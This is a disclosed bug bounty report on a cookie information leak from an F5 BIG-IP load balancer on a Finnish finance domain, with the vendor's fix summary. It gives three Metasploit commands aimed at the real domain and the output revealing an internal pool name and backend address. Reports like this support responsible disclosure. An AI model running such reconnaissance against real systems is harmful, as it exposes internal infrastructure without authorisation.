@@ -1,0 +1,64 @@
+ReportLink:https://hackerone.com/reports/384905
+WeaknessName:Information Disclosure
+Reporter:https://hackerone.com/lovepakistan
+ReportedTo:LocalTapiola(localtapiola)
+BountyAmount:50.0
+Severity:medium
+State:Closed
+DateOfDisclosure:10.09.2018 1:21:20
+
+Summary:
+##Issue
+
+The reporter found that the f5 Big-IP cookies potentially reveal BigIP pool name, backend's IP address and port, routed domain.
+
+##Fix
+
+There is an option in Big-IP to fix this. Just click, apply and you are done.
+
+##Reasoning
+
+The issue is not critical,but it was an easy fix. Note: we will apply this to all domains and no further reports on this for other domains will be accepted never ever.
+## Basic report information
+**Summary:** 
+The Same issue was reported on www.myynti.lahitapiolarahoitus.fi by another reporter. It was fixed for that. But when I test the same issue on lahitapiolarahoitus.fi. It is also causing leakage of information.
+
+**Description:** 
+I just identify F5 BigIP load balancers and leaks backend information (pool name, backend's IP address and port, routed domain) through cookies inserted by the BigIP system.
+
+## Browsers / Apps Verified In:
+
+  * MetaSploit Framework
+
+## Steps To Reproduce:
+
+MetaSploit commands:
+1. `use auxiliary/gather/f5_bigip_cookie_disclosure`
+2. `SET RHOST lahitapiolarahoitus.fi`
+3. `run`
+
+ OUTPUT:
+`[*] Starting request /
+[+] F5 BigIP load balancing cookie "BIGipServerltr-prod_pool = 224700608.20480.0000" found
+[+] Load balancing pool name "ltr-prod_pool" found
+[+] Backend 192.168.100.13:80 found
+[*] Auxiliary module execution completed`
+
+## Additional material
+
+  * Refer to F322967 for domain lahitapiolarahoitus.fi
+  * Refer to F322966 for domain myynti.lahitapiolarahoitus.fi (fixed)
+
+## Related reports, best practices
+
+Related Report: #330716
+Refer to F322966 as it is Fixed.
+
+## References:
+https://www.rapid7.com/db/modules/auxiliary/gather/f5_bigip_cookie_disclosure
+https://support.f5.com/csp/article/K14784%3Fsr%3D45997495
+http://www.systemadvise.com/2016/11/f5-big-ip-cookie-remote-information.html
+
+## Impact
+
+Attacker can leaks back-end information (pool name, backend's IP address and port, routed domain) through cookies inserted by the BigIP system.
